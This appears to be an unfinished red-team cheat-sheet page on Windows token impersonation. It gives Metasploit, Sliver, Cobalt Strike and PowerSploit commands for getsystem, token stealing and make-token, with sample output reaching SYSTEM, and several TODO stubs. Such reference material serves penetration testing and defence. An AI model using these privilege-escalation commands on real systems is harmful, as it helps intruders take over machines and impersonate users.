# Token Impersonation

## 01 - Getsystem

### 1.1 - Manual

TODO: Write information related to getsystem that is done without using Command and Control (C2) frameworks

### 1.2 - Metasploit

#### 1.2.1 - Help Menu

```
meterpreter > getsystem -h
Usage: getsystem [options]

Attempt to elevate your privilege to that of local system.

OPTIONS:

    -h   Help Banner.
    -t   The technique to use. (Default to '0').
		0 : All techniques available
		1 : Named Pipe Impersonation (In Memory/Admin)
		2 : Named Pipe Impersonation (Dropper/Admin)
		3 : Token Duplication (In Memory/Admin)
		4 : Named Pipe Impersonation (RPCSS variant)
		5 : Named Pipe Impersonation (PrintSpooler variant)
```

#### 1.2.2 - Basics

```
meterpreter > getsystem -t 1
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 1.3 - Sliver

TODO: Write more information about getsystem sliver command with help menu

`sliver (IMPLANT_NAME) > getsystem`

### 1.4 - Cobalt Strike

`beacon> getsystem`

## 02 - Token Manipulation

### 2.1 - Powersploit

TODO: Write more information related to this powersploit module

`PS C:\> Invoke-TokenManipulation -Enumerate`

`PS C:\> Invoke-TokenManipulation -ImpersonateUser -UserName "<domain_name>\<username>"`

### 2.2 - Metasploit

`meterpreter > steal_token <pid>`

### 2.3 - Sliver

```
sliver (IMPLANT_NAME) > make-token -u <username> -d . -p <password>

sliver (IMPLANT_NAME) > execute -T -o <commands>
```

### 2.4 - Cobalt Strike

`beacon> make_token <domain_name>\<username> <password>`

## References

- [What Happens When I Type Getsystem](https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/)

- [XPNSec Blog: Becoming System](https://blog.xpnsec.com/becoming-system/)

- [Token Stealing and Incognito](https://pentestlab.blog/2012/08/07/token-stealing-and-incognito/)

- [DMCXBlue Gitbook: Privilege Escalation Access Token Manipulation](https://dmcxblue.gitbook.io/red-team-notes/privesc/access-token-manipulation)

- [Exploit DB: Abusing Token Privileges For Local Privilege Escalation](https://www.exploit-db.com/papers/42556)

- [Helpsystems: Cobalt Strike Privilege Escalation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_privilege-escalation.htm)

- [HarmJ0y Get-System.ps1](https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Get-System.ps1)

- [GetSystem C# implementation](https://github.com/py7hagoras/GetSystem)